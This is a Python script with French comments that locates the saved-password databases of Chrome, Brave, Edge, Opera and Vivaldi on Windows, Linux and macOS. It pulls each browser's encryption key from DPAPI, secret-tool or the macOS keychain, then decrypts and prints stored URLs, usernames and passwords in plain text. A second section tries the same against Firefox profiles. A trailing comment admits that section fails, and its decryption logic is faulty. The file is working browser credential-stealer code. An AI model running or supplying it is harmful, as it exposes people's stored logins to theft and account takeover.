import os
import sys
import json
import sqlite3
import shutil
import base64
import subprocess
from pathlib import Path
from Crypto.Cipher import AES
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend


# Vérification de l'OS
IS_WINDOWS = sys.platform.startswith("win")
IS_LINUX = sys.platform.startswith("linux")
IS_MAC = sys.platform.startswith("darwin")

if IS_WINDOWS:
    import win32crypt
elif IS_LINUX or IS_MAC:
    import keyring  # Utilisé pour récupérer la clé sur Linux/macOS

# Définition des navigateurs Chromium supportés et leurs chemins
CHROMIUM_BROWSERS = {
    "Google Chrome": {
        "windows": Path(os.getenv("LOCALAPPDATA")) / "Google" / "Chrome" / "User Data",
        "linux": Path.home() / ".config" / "google-chrome",
        "mac": Path.home() / "Library" / "Application Support" / "Google" / "Chrome",
    },
    "Brave": {
        "windows": Path(os.getenv("LOCALAPPDATA"))
        / "BraveSoftware"
        / "Brave-Browser"
        / "User Data",
        "linux": Path.home() / ".config" / "BraveSoftware" / "Brave-Browser",
        "mac": Path.home()
        / "Library"
        / "Application Support"
        / "BraveSoftware"
        / "Brave-Browser",
    },
    "Microsoft Edge": {
        "windows": Path(os.getenv("LOCALAPPDATA")) / "Microsoft" / "Edge" / "User Data",
        "linux": Path.home() / ".config" / "microsoft-edge",
        "mac": Path.home() / "Library" / "Application Support" / "Microsoft Edge",
    },
    "Opera": {
        "windows": Path(os.getenv("APPDATA")) / "Opera Software" / "Opera Stable",
        "linux": Path.home() / ".config" / "opera",
        "mac": Path.home() / "Library" / "Application Support" / "Opera",
    },
    "Vivaldi": {
        "windows": Path(os.getenv("LOCALAPPDATA")) / "Vivaldi" / "User Data",
        "linux": Path.home() / ".config" / "vivaldi",
        "mac": Path.home() / "Library" / "Application Support" / "Vivaldi",
    },
}


# Fonction pour récupérer la clé de chiffrement
def get_encryption_key_Chromium(local_state_path):
    try:
        with open(local_state_path, "r", encoding="utf-8") as file:
            local_state = json.load(file)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]

        if IS_WINDOWS:
            return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

        elif IS_LINUX:
            return subprocess.check_output(
                ["secret-tool", "lookup", "chrome", "os_crypt"]
            ).strip()

        elif IS_MAC:
            return (
                subprocess.check_output(
                    [
                        "security",
                        "find-generic-password",
                        "-s",
                        "Chrome Safe Storage",
                        "-w",
                    ]
                )
                .strip()
                .encode()
            )

    except Exception as e:
        print(f"❌ Erreur récupération clé : {e}")
        return None


# Fonction pour déchiffrer un mot de passe
def decrypt_password_Chromium(encrypted_password, key):
    try:
        if encrypted_password[:3] != b"v10":
            return "Format inconnu"

        iv = encrypted_password[3:15]  # IV de 12 octets
        payload = encrypted_password[15:-16]  # Données chiffrées
        tag = encrypted_password[-16:]  # Tag d'authentification AES-GCM

        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt_and_verify(payload, tag).decode()
    except Exception:
        return "Format inconnu"


# Fonction pour extraire les mots de passe stockés
def extract_passwords_Chromium():
    for browser, paths in CHROMIUM_BROWSERS.items():
        if IS_WINDOWS:
            user_data_path = paths["windows"]
        elif IS_LINUX:
            user_data_path = paths["linux"]
        else:
            user_data_path = paths["mac"]

        if not user_data_path.exists():
            continue

        local_state_path = user_data_path / "Local State"
        if not local_state_path.exists():
            continue

        key = get_encryption_key_Chromium(local_state_path)
        if key is None:
            continue

        print(f"\n=====  {browser} ✅  =====")

        # Enregistrer ça sous la forme d'un objet Profile avec le nom, le chemin, et les possibles fichiers de mots de passe
        class Profile:
            def __init__(self, name, path, files):
                self.name = name
                self.path = path
                self.files = files

        # Lister tous les profils utilisateurs
        # Recherche de tous les dossiers qui contiennent Login Data ou Login Data For Account
        profiles = []
        for profile in user_data_path.iterdir():
            if profile.is_dir():
                files = [file for file in profile.glob("Login Data*") if file.name in ["Login Data", "Login Data For Account"]]
                if files:
                    profiles.append(Profile(profile.name, profile, files))

        if not profiles:
            print("❌ Aucun profil trouvé")
            continue
        else :
            print(f"👤 {len(profiles)} Profil(s) trouvé(s)")

        for profile in profiles:
            nb_pass = 0
            print(f"\n🔍 Profil: {profile.name}")

            for login_db in profile.files:
                
                # Copie temporaire du fichier de mots de passe
                temp_db = login_db.with_suffix(".temp")
                shutil.copy(login_db, temp_db)

                try:
                    conn = sqlite3.connect(str(temp_db))
                    cursor = conn.cursor()
                    cursor.execute(
                        "SELECT origin_url, action_url, username_value, password_value FROM logins"
                    )

                    counter = 0
                    for origin_url, action_url, username, encrypted_password in cursor.fetchall():
                        password = decrypt_password_Chromium(encrypted_password, key)
                        if password and password != "Format inconnu":
                            print(f"[🌍] URL d'origine: {origin_url}")
                            print(f"[🌍] URL de login: {action_url}")
                            print(f"[👤] Username: {username}")
                            print(f"[🔑] Password: {password}\n")
                            counter += 1
                            # Uniquement les 3 premiers résultats pour tester
                            if counter > 2:
                                break
                            nb_pass += 1

                    conn.close()
                    os.remove(temp_db)

                except Exception as e:
                    print(f"❌ Erreur extraction {browser} : {e}")

            if nb_pass == 0:
                print("❌ Aucun mot de passe trouvé")
            else:
                print(f"🔑 {nb_pass} mot(s) de passe trouvé(s)")


# Détection du système d'exploitation
IS_WINDOWS = os.name == "nt"
IS_LINUX = os.name == "posix" and "linux" in os.sys.platform
IS_MAC = os.name == "posix" and "darwin" in os.sys.platform

# Chemins par défaut de Firefox
if IS_WINDOWS:
    FIREFOX_PATH = Path(os.getenv("APPDATA")) / "Mozilla" / "Firefox" / "Profiles"
elif IS_LINUX:
    FIREFOX_PATH = Path.home() / ".mozilla" / "firefox"
elif IS_MAC:
    FIREFOX_PATH = Path.home() / "Library" / "Application Support" / "Firefox"
else:
    raise SystemExit("Système non pris en charge.")


# Fonction pour récupérer le profil Firefox principal
def get_firefox_profiles():
    profiles = []
    profiles_ini = FIREFOX_PATH / "profiles.ini"

    if not profiles_ini.exists():
        print("Aucun profil Firefox trouvé.")
        return []

    with open(profiles_ini, "r", encoding="utf-8") as f:
        for line in f.readlines():
            if line.startswith("Path="):
                profiles.append(FIREFOX_PATH / line.strip().split("=")[1])

    return profiles


# Fonction pour récupérer la clé de chiffrement depuis key4.db
def get_decryption_key(profile_path):
    key_db = profile_path / "key4.db"
    if not key_db.exists():
        print("Fichier key4.db non trouvé.")
        return None

    conn = sqlite3.connect(str(key_db))
    cursor = conn.cursor()
    cursor.execute("SELECT item1, item2 FROM metaData WHERE id = 'password' ")
    key_data = cursor.fetchone()
    conn.close()

    if key_data:
        global_salt, encrypted_key = key_data
        return decrypt_nss_key(global_salt, encrypted_key)
    return None


# Fonction de déchiffrement avec AES-GCM
def decrypt_nss_key(global_salt, encrypted_key):
    try:
        cipher = Cipher(
            algorithms.AES(global_salt),
            modes.GCM(encrypted_key[:12]),
            backend=default_backend(),
        )
        decryptor = cipher.decryptor()
        return decryptor.update(encrypted_key[12:]) + decryptor.finalize()
    except Exception as e:
        print(f"Erreur de déchiffrement NSS: {e}")
        return None


# Extraction et déchiffrement des mots de passe
def extract_firefox_passwords():
    profiles = get_firefox_profiles()
    results = {}

    for profile in profiles:
        logins_path = profile / "logins.json"
        if not logins_path.exists():
            continue

        key = get_decryption_key(profile)
        if key is None:
            continue

        with open(logins_path, "r", encoding="utf-8") as f:
            logins = json.load(f)

        decrypted_passwords = []
        for login in logins.get("logins", []):
            try:
                password = decrypt_nss_key(
                    key, base64.b64decode(login["encryptedPassword"])
                )
                if password:
                    decrypted_passwords.append(
                        {
                            "url": login["hostname"],
                            "username": login["username"],
                            "password": password.decode(),
                        }
                    )
            except Exception as e:
                print(f"Erreur de déchiffrement d'un mot de passe: {e}")

        if decrypted_passwords:
            results[profile.name] = decrypted_passwords

    return json.dumps(results, indent=4)


if __name__ == "__main__":
    print(extract_firefox_passwords())
    extract_passwords_Chromium()

####### FIREFOX MARCHE PAS, PROBLEME POUR TROUVER LES PROFILS
